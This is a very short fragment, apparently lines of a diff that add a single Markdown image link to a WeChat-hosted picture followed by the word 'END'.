+![](https://mmbiz.qpic.cn/mmbiz_png/GGO3HTibyP71myKPM2noxIP2ibBx76sOUicLYYxzWyPiaEZshLrXKKibCn2MR3u83CFEdR2QCibWicxPCwWB3gBSEX71g/640?wx_fmt=png)
+
+END
